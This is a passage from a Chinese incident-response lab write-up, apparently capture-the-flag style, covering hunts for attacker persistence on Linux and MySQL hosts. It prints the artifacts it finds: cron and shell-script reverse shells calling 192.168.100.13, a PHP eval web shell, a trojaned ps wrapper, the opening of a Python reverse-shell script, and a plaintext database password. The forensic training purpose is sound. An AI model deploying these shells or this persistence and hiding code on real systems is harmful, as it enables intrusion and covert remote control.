</span></span><span style=display:flex><span><span style=color:#75715e># Output of the crontab jobs (including errors) is sent through</span>
</span></span><span style=display:flex><span><span style=color:#75715e># email to the user the crontab file belongs to (unless redirected).</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># For example, you can run a backup of all your user accounts</span>
</span></span><span style=display:flex><span><span style=color:#75715e># at 5 a.m every week with:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># For more information see the manual pages of crontab(5) and cron(8)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span>*/1 * * * *  /bin/sh -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>执行 <code>crontab -l</code> 会显示当前用户的定时任务。黑客常常利用 <strong>cron</strong> 来维持后门访问或周期性执行恶意脚本。</p><h2 id=q4-4>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:~# cd .ssh
</span></span><span style=display:flex><span>root@ip-10-0-10-9:~/.ssh# ls
</span></span><span style=display:flex><span>authorized_keys
</span></span><span style=display:flex><span>root@ip-10-0-10-9:~/.ssh# cat authorized_keys
</span></span><span style=display:flex><span>REDIS0009�      redis-ver5.0.1�
</span></span><span style=display:flex><span>�edis-bits�@�ctime�tO�dused-mem�XU
</span></span><span style=display:flex><span> aof-preamble���xxsshB9
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8<span style=color:#f92672>=</span> xj-test-user
</span></span></code></pre></div><p><a href=https://github.com/xj-test-user/redis-rogue-getshell/commit/6f2bec361360873c49b4e6cd45b81ca5c9456e43#diff-e2fa2f9050e8bd7ab54078195ada26a886f357d57fa44e80b6f76dca29acac48>first commit · xj-test-user/redis-rogue-getshell@6f2bec3</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>flag<span style=color:#f92672>{</span>xj-test-user-wow-you-find-flag<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=q5-3>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:/usr/bin# sudo find ./ -type f -perm <span style=color:#ae81ff>777</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>./ps
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:/usr/bin# cat ps
</span></span><span style=display:flex><span><span style=color:#75715e>#/bin/bash</span>
</span></span><span style=display:flex><span>oldifs<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$IFS<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>IFS<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;\$n&#39;</span>
</span></span><span style=display:flex><span>result<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>ps_ $1 $2 $3|grep -v <span style=color:#e6db74>&#39;threadd&#39;</span> <span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> v in $result;
</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        echo -e <span style=color:#e6db74>&#34;</span>$v<span style=color:#e6db74>\t&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>IFS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$oldifs<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#//c195i2923381905517d818e313792d196</span>
</span></span></code></pre></div><h1 id=第二章日志分析-mysql应急响应>第二章日志分析-mysql应急响应</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.黑客第一次写入的shell flag{关键字符串} 
</span></span><span style=display:flex><span>2.黑客反弹shell的ip flag{ip}
</span></span><span style=display:flex><span>3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx
</span></span><span style=display:flex><span>4.黑客获取的权限 flag{whoami后的值}
</span></span></code></pre></div><h2 id=q1-5>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:~# ls /
</span></span><span style=display:flex><span>1.log  boot  etc   lib    media  opt   root  sbin  supervisord.log  sys  usr
</span></span><span style=display:flex><span>bin    dev   home  lib64  mnt    proc  run   srv   supervisord.pid  tmp  var
</span></span><span style=display:flex><span>root@xuanji:~# cd /var/www/html
</span></span><span style=display:flex><span>root@xuanji:/var/www/html# ls
</span></span><span style=display:flex><span>Writenote.php  common.php  images     js       search.php  tmpubzil.php  tmpuvdzm.php
</span></span><span style=display:flex><span>adminer.php    css         index.php  log.php  sh.php      tmputsrv.php
</span></span><span style=display:flex><span>root@xuanji:/var/www/html# cat sh.php
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>       <span style=color:#ae81ff>2</span>       &lt;?php @eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>])</span>;?&gt;     <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>//ccfda79e-7aa1-4275-bc26-a6189eb9a20b
</span></span></code></pre></div><h2 id=q2-5>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:/var/log/mysql# ls
</span></span><span style=display:flex><span>error.log
</span></span><span style=display:flex><span>root@xuanji:/var/log/mysql# sudo grep -oE <span style=color:#e6db74>&#39;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+&#39;</span> error.log | sort | uniq -c | sort -nr
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>6</span> 0.14.04.1
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>3</span> 127.0.0.1
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>2</span> 192.168.100.13
</span></span></code></pre></div><pre tabindex=0><code>flag{192.168.100.13}
</code></pre><h2 id=q3-5>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>root@xuanji:~# cd /tmp
</span></span><span style=display:flex><span>root@xuanji:/tmp# ls
</span></span><span style=display:flex><span>1.sh                                    mysql-stderr---supervisor-oNZcZD.log  ssh-stdout---supervisor-QOD15F.log
</span></span><span style=display:flex><span>apache2-stderr---supervisor-BJwrWU.log  mysql-stdout---supervisor-MHzWNW.log  supervisor.sock
</span></span><span style=display:flex><span>apache2-stdout---supervisor-jcN7iK.log  ssh-stderr---supervisor-obsAxv.log
</span></span><span style=display:flex><span>root@xuanji:/tmp# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>drwxrwxrwt. <span style=color:#ae81ff>1</span> root  root  <span style=color:#ae81ff>16384</span> Mar  <span style=color:#ae81ff>4</span> 13:09 .
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>1</span> root  root     <span style=color:#ae81ff>85</span> Mar  <span style=color:#ae81ff>4</span> 13:09 ..
</span></span><span style=display:flex><span>-rw-rw----. <span style=color:#ae81ff>1</span> mysql mysql    <span style=color:#ae81ff>42</span> Aug  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2023</span> 1.sh
</span></span><span style=display:flex><span>-rw-------. <span style=color:#ae81ff>1</span> root  root    <span style=color:#ae81ff>700</span> Mar  <span style=color:#ae81ff>4</span> 13:09 apache2-stderr---supervisor-BJwrWU.log
</span></span><span style=display:flex><span>-rw-------. <span style=color:#ae81ff>1</span> root  root    <span style=color:#ae81ff>124</span> Mar  <span style=color:#ae81ff>4</span> 13:09 apache2-stdout---supervisor-jcN7iK.log
</span></span><span style=display:flex><span>-rw-------. <span style=color:#ae81ff>1</span> root  root    <span style=color:#ae81ff>155</span> Mar  <span style=color:#ae81ff>4</span> 13:09 mysql-stderr---supervisor-oNZcZD.log
</span></span><span style=display:flex><span>-rw-------. <span style=color:#ae81ff>1</span> root  root    <span style=color:#ae81ff>153</span> Mar  <span style=color:#ae81ff>4</span> 13:09 mysql-stdout---supervisor-MHzWNW.log
</span></span><span style=display:flex><span>-rw-------. <span style=color:#ae81ff>1</span> root  root      <span style=color:#ae81ff>0</span> Mar  <span style=color:#ae81ff>4</span> 13:09 ssh-stderr---supervisor-obsAxv.log
</span></span><span style=display:flex><span>-rw-------. <span style=color:#ae81ff>1</span> root  root      <span style=color:#ae81ff>0</span> Mar  <span style=color:#ae81ff>4</span> 13:09 ssh-stdout---supervisor-QOD15F.log
</span></span><span style=display:flex><span>srwx------. <span style=color:#ae81ff>1</span> root  root      <span style=color:#ae81ff>0</span> Mar  <span style=color:#ae81ff>4</span> 13:09 supervisor.sock
</span></span><span style=display:flex><span>root@xuanji:/tmp# cat 1.sh
</span></span><span style=display:flex><span>bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1root@xuanji:/tmp# 
</span></span></code></pre></div><p><strong>在 MySQL 提权攻击中，最常用的一些方法包括利用 <code>INTO OUTFILE</code> 写入文件、利用 <code>LOAD_FILE</code> 读取文件，以及利用 UDF（用户定义函数）执行系统命令。这些方法因其简单高效、攻击面广而被广泛采用。</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find ./ -name <span style=color:#e6db74>&#34;*.php&#34;</span> | xargs grep <span style=color:#e6db74>&#34;root&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:~# cd /var/www/html
</span></span><span style=display:flex><span>root@xuanji:/var/www/html# find ./ -name <span style=color:#e6db74>&#34;*.php&#34;</span> | xargs grep <span style=color:#e6db74>&#34;root&#34;</span>
</span></span><span style=display:flex><span>./common.php:$conn<span style=color:#f92672>=</span>mysqli_connect<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;localhost&#34;</span>,<span style=color:#e6db74>&#34;root&#34;</span>,<span style=color:#e6db74>&#34;334cc35b3c704593&#34;</span>,<span style=color:#e6db74>&#34;cms&#34;</span>,<span style=color:#e6db74>&#34;3306&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>./adminer.php:rootQuery<span style=color:#f92672>(</span>$Yf,$_b<span style=color:#f92672>=</span>array<span style=color:#f92672>()</span>,$Se<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;GET&#39;</span><span style=color:#f92672>){</span>@ini_set<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;track_errors&#39;</span>,1<span style=color:#f92672>)</span>;$Tc<span style=color:#f92672>=</span>@file_get_contents<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;</span>$this<span style=color:#e6db74>-&gt;_url/&#34;</span>.ltrim<span style=color:#f92672>(</span>$Yf,<span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>)</span>,false,stream_context_create<span style=color:#f92672>(</span>array<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;http&#39;</span><span style=color:#f92672>=</span>&gt;array<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;method&#39;</span><span style=color:#f92672>=</span>&gt;$Se,<span style=color:#e6db74>&#39;content&#39;</span><span style=color:#f92672>=</span>&gt;$_b<span style=color:#f92672>===</span>null?$_b:json_encode<span style=color:#f92672>(</span>$_b<span style=color:#f92672>)</span>,<span style=color:#e6db74>&#39;header&#39;</span><span style=color:#f92672>=</span>&gt;<span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span>,<span style=color:#e6db74>&#39;ignore_errors&#39;</span><span style=color:#f92672>=</span>&gt;1,<span style=color:#f92672>))))</span>;<span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!$Tc<span style=color:#f92672>){</span>$this-&gt;error<span style=color:#f92672>=</span>$php_errormsg;<span style=color:#66d9ef>return</span>$Tc;<span style=color:#f92672>}</span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!preg_match<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;~^HTTP/[0-9.]+ 2~i&#39;</span>,$http_response_header<span style=color:#f92672>[</span>0<span style=color:#f92672>])){</span>$this-&gt;error<span style=color:#f92672>=</span>$Tc;<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>./adminer.php:query<span style=color:#f92672>(</span>$Yf,$_b<span style=color:#f92672>=</span>array<span style=color:#f92672>()</span>,$Se<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;GET&#39;</span><span style=color:#f92672>){</span><span style=color:#66d9ef>return</span>$this-&gt;rootQuery<span style=color:#f92672>((</span>$this-&gt;_db!<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>?<span style=color:#e6db74>&#34;</span>$this<span style=color:#e6db74>-&gt;_db/&#34;</span>:<span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>)</span>.ltrim<span style=color:#f92672>(</span>$Yf,<span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>)</span>,$_b,$Se<span style=color:#f92672>)</span>;<span style=color:#f92672>}</span><span style=color:#66d9ef>function</span>
</span></span><span style=display:flex><span>./adminer.php:get_databases<span style=color:#f92672>(){</span>global$h;$I<span style=color:#f92672>=</span>$h-&gt;rootQuery<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;_aliases&#39;</span><span style=color:#f92672>)</span>;<span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$I<span style=color:#f92672>){</span>$I<span style=color:#f92672>=</span>array_keys<span style=color:#f92672>(</span>$I<span style=color:#f92672>)</span>;sort<span style=color:#f92672>(</span>$I,SORT_STRING<span style=color:#f92672>)</span>;<span style=color:#f92672>}</span><span style=color:#66d9ef>return</span>$I;<span style=color:#f92672>}</span><span style=color:#66d9ef>function</span>
</span></span><span style=display:flex><span>./adminer.php:create_database<span style=color:#f92672>(</span>$m<span style=color:#f92672>){</span>global$h;<span style=color:#66d9ef>return</span>$h-&gt;rootQuery<span style=color:#f92672>(</span>urlencode<span style=color:#f92672>(</span>$m<span style=color:#f92672>)</span>,null,<span style=color:#e6db74>&#39;PUT&#39;</span><span style=color:#f92672>)</span>;<span style=color:#f92672>}</span><span style=color:#66d9ef>function</span>
</span></span><span style=display:flex><span>./adminer.php:drop_databases<span style=color:#f92672>(</span>$l<span style=color:#f92672>){</span>global$h;<span style=color:#66d9ef>return</span>$h-&gt;rootQuery<span style=color:#f92672>(</span>urlencode<span style=color:#f92672>(</span>implode<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;,&#39;</span>,$l<span style=color:#f92672>))</span>,array<span style=color:#f92672>()</span>,<span style=color:#e6db74>&#39;DELETE&#39;</span><span style=color:#f92672>)</span>;<span style=color:#f92672>}</span><span style=color:#66d9ef>function</span>
</span></span><span style=display:flex><span>./adminer.php:rootQuery<span style=color:#f92672>(</span>$m,$G<span style=color:#f92672>){</span>@ini_set<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;track_errors&#39;</span>,1<span style=color:#f92672>)</span>;$Tc<span style=color:#f92672>=</span>@file_get_contents<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;</span>$this<span style=color:#e6db74>-&gt;_url/?database=</span>$m<span style=color:#e6db74>&#34;</span>,false,stream_context_create<span style=color:#f92672>(</span>array<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;http&#39;</span><span style=color:#f92672>=</span>&gt;array<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;method&#39;</span><span style=color:#f92672>=</span>&gt;<span style=color:#e6db74>&#39;POST&#39;</span>,<span style=color:#e6db74>&#39;content&#39;</span><span style=color:#f92672>=</span>&gt;$this-&gt;isQuerySelectLike<span style=color:#f92672>(</span>$G<span style=color:#f92672>)</span>?<span style=color:#e6db74>&#34;</span>$G<span style=color:#e6db74> FORMAT JSONCompact&#34;</span>:$G,<span style=color:#e6db74>&#39;header&#39;</span><span style=color:#f92672>=</span>&gt;<span style=color:#e6db74>&#39;Content-type: application/x-www-form-urlencoded&#39;</span>,<span style=color:#e6db74>&#39;ignore_errors&#39;</span><span style=color:#f92672>=</span>&gt;1,<span style=color:#f92672>))))</span>;<span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$Tc<span style=color:#f92672>===</span>false<span style=color:#f92672>){</span>$this-&gt;error<span style=color:#f92672>=</span>$php_errormsg;<span style=color:#66d9ef>return</span>$Tc;<span style=color:#f92672>}</span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>!preg_match<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;~^HTTP/[0-9.]+ 2~i&#39;</span>,$http_response_header<span style=color:#f92672>[</span>0<span style=color:#f92672>])){</span>$this-&gt;error<span style=color:#f92672>=</span>$Tc;<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>./adminer.php:query<span style=color:#f92672>(</span>$G<span style=color:#f92672>){</span><span style=color:#66d9ef>return</span>$this-&gt;rootQuery<span style=color:#f92672>(</span>$this-&gt;_db,$G<span style=color:#f92672>)</span>;<span style=color:#f92672>}</span><span style=color:#66d9ef>function</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>MariaDB [(<span style=color:#66d9ef>none</span>)]<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>show</span> <span style=color:#66d9ef>global</span> variables <span style=color:#66d9ef>like</span> <span style=color:#e6db74>&#39;%secure%&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>+</span><span style=color:#75715e>------------------+-------+
</span></span></span><span style=display:flex><span><span style=color:#f92672>|</span> Variable_name    <span style=color:#f92672>|</span> Value <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>+</span><span style=color:#75715e>------------------+-------+
</span></span></span><span style=display:flex><span><span style=color:#f92672>|</span> secure_auth      <span style=color:#f92672>|</span> <span style=color:#66d9ef>OFF</span>   <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> secure_file_priv <span style=color:#f92672>|</span>       <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>+</span><span style=color:#75715e>------------------+-------+
</span></span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>rows</span> <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>set</span> (<span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>00</span> sec)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:~# cd /usr/lib/mysql/plugin/
</span></span><span style=display:flex><span>root@xuanji:/usr/lib/mysql/plugin# ls
</span></span><span style=display:flex><span>auth_pam.so     dialog.so     handlersocket.so         mysqludf.so         semisync_slave.so  sphinx.so      udf.so
</span></span><span style=display:flex><span>auth_socket.so  ha_innodb.so  mysql_clear_password.so  semisync_master.so  server_audit.so    sql_errlog.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/lib/mysql/plugin/udf.so
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>B1818BDE4E310F3D23F1005185B973E7<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=q4-5>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:~# ps aux
</span></span><span style=display:flex><span>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span style=display:flex><span>root           <span style=color:#ae81ff>1</span>  0.0  0.4  <span style=color:#ae81ff>52184</span> <span style=color:#ae81ff>16804</span> ?        Ss   13:09   0:00 /usr/bin/python /usr/bin/supervisord -n
</span></span><span style=display:flex><span>root           <span style=color:#ae81ff>9</span>  0.0  0.0  <span style=color:#ae81ff>18236</span>  <span style=color:#ae81ff>3240</span> ?        S    13:09   0:00 /bin/bash /usr/bin/mysqld_safe
</span></span><span style=display:flex><span>root          <span style=color:#ae81ff>10</span>  0.0  0.1  <span style=color:#ae81ff>61400</span>  <span style=color:#ae81ff>5444</span> ?        S    13:09   0:00 /usr/sbin/sshd -D
</span></span><span style=display:flex><span>mysql        <span style=color:#ae81ff>364</span>  0.0  1.6 <span style=color:#ae81ff>634320</span> <span style=color:#ae81ff>64572</span> ?        Sl   13:09   0:00 /usr/sbin/mysqld --basedir<span style=color:#f92672>=</span>/usr --datadir<span style=color:#f92672>=</span>/var/lib/mysql --plugin-d
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>401</span>  0.0  0.1  <span style=color:#ae81ff>92724</span>  <span style=color:#ae81ff>6220</span> ?        Rs   13:10   0:00 sshd: root@pts/0    
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>412</span>  0.0  0.0  <span style=color:#ae81ff>18296</span>  <span style=color:#ae81ff>3420</span> pts/0    Ss   13:10   0:00 -bash
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>425</span>  0.0  0.0  <span style=color:#ae81ff>12836</span>  <span style=color:#ae81ff>1952</span> ?        Ss   13:10   0:00 /usr/lib/openssh/sftp-server
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>438</span>  0.0  0.0  <span style=color:#ae81ff>12836</span>  <span style=color:#ae81ff>1948</span> ?        Ss   13:11   0:00 /usr/lib/openssh/sftp-server
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>665</span>  0.0  0.0  <span style=color:#ae81ff>12836</span>  <span style=color:#ae81ff>1800</span> ?        Ss   13:22   0:00 /usr/lib/openssh/sftp-server
</span></span><span style=display:flex><span>root         <span style=color:#ae81ff>682</span>  0.0  0.0  <span style=color:#ae81ff>15584</span>  <span style=color:#ae81ff>2064</span> pts/0    R+   13:26   0:00 ps aux
</span></span></code></pre></div><pre tabindex=0><code>flag{mysql}
</code></pre><h1 id=第三章-权限维持-linux权限维持-隐藏>第三章 权限维持-linux权限维持-隐藏</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.黑客隐藏的隐藏的文件 完整路径md5
</span></span><span style=display:flex><span>2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}
</span></span><span style=display:flex><span>3.黑客提权所用的命令 完整路径的md5 flag{md5} 
</span></span><span style=display:flex><span>4.黑客尝试注入恶意代码的工具完整路径md5
</span></span><span style=display:flex><span>5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx}
</span></span></code></pre></div><h2 id=q1-6>Q1</h2><p>查找隐藏文件是开头带<code>.</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -name <span style=color:#e6db74>&#34;.*&#34;</span>
</span></span><span style=display:flex><span>....
</span></span><span style=display:flex><span>/tmp/.temp
</span></span><span style=display:flex><span>/tmp/.temp/libprocesshider/.git
</span></span><span style=display:flex><span>/tmp/.temp/libprocesshider/.gitignore
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/.dockerenv
</span></span><span style=display:flex><span>root@xuanji:~# cd /tmp/.temp/
</span></span><span style=display:flex><span>root@xuanji:/tmp/.temp# ls
</span></span><span style=display:flex><span>libprocesshider
</span></span><span style=display:flex><span>root@xuanji:/tmp/.temp# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>3</span> root root    <span style=color:#ae81ff>29</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> .
</span></span><span style=display:flex><span>drwxrwxrwt. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>16384</span> Mar  <span style=color:#ae81ff>4</span> 14:11 ..
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>3</span> root root   <span style=color:#ae81ff>119</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> libprocesshider
</span></span><span style=display:flex><span>root@xuanji:/tmp/.temp# cd libprocesshider
</span></span><span style=display:flex><span>root@xuanji:/tmp/.temp/libprocesshider# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>3</span> root root  <span style=color:#ae81ff>119</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> .
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>3</span> root root   <span style=color:#ae81ff>29</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> ..
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>8</span> root root  <span style=color:#ae81ff>163</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> .git
</span></span><span style=display:flex><span>-rw-r--r--. <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>20</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> .gitignore
</span></span><span style=display:flex><span>-rwxr-xr-x. <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>826</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> 1.py
</span></span><span style=display:flex><span>-rw-r--r--. <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>168</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> Makefile
</span></span><span style=display:flex><span>-rw-r--r--. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>2941</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> README.md
</span></span><span style=display:flex><span>-rw-r--r--. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>3477</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> processhider.c
</span></span><span style=display:flex><span>-rw-r--r--. <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>243</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> shell.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:/tmp/.temp/libprocesshider# cat 1.py
</span></span><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>import socket,subprocess,os,sys, time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pidrg <span style=color:#f92672>=</span> os.fork<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> pidrg &gt; 0:
